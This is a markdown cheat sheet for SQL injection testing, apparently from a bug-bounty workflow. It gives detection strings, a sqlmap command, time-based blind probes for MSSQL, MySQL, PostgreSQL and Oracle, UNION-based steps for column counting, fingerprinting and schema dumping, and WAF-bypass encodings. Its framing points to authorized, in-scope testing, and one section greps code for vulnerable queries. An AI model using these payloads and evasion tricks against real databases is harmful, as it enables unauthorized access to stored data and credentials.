# SQL Injection

## Detection
```sql
' OR '1'='1
' UNION SELECT NULL--
'; SELECT 1/0--   → divide by zero confirms SQLi

# sqlmap
python3 ~/tools/sqlmap/sqlmap.py -u "https://target.com/search?q=test" --batch --level=3
```

## Grep for Vulnerable Code
```bash
# Python — no placeholder = string concat = vulnerable
grep -rn "execute\|executemany\|raw(" --include="*.py" | grep -v "?"

# JavaScript — string concat in query
grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"

# PHP — variable in raw query
grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
```

## Stack → DBMS (Fingerprint Before Blind Testing)
| Tech Signal | DBMS | Blind Probe |
|---|---|---|
| `.asp`/IIS/ASP.NET | MSSQL | `WAITFOR DELAY '0:0:5'` |
| `.php`/LAMP | MySQL/MariaDB | `SLEEP(5)` |
| Java/Spring, `.jsp` | PG/MSSQL/Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message('a',5)` |
| Python/Rails | PG/MySQL | `pg_sleep(5)` / `SLEEP(5)` |

## Prove It (Read-Only)
```sql
-- Column count
' ORDER BY 1--  → increment until error = N-1 cols

-- Fingerprint + identity (ONE readable value = valid finding)
0' UNION SELECT NULL,@@version,NULL--              -- MSSQL/MySQL
0' UNION SELECT NULL,version(),NULL--              -- PostgreSQL
0' UNION SELECT NULL,SYSTEM_USER,NULL--            -- MSSQL

-- Schema walk + one-request dump
0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--
-- MySQL: GROUP_CONCAT() · MSSQL/PG: STRING_AGG() · Oracle: LISTAGG()
```

**Reading a credentials/config table is reportable on its own — RCE not required.**
(DB→OS escalation only if DB user is sysadmin/superuser AND host exec is in scope.)

## WAF Bypass for SQLi
Run: `bughunter/tools/waf_encoder.py "<payload>" --class sqli`
- Comment injection: `SE/**/LECT`
- MySQL version comment: `/*!50000 UNION*/`
- Case mix: `SeLeCt`
- Operator substitute: `OR`→`||`, `=`→`LIKE`
- Whitespace swap: `%0a`, `%0b`, `/**/ `
- AWS WAF: try `/**/` between every token
- ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution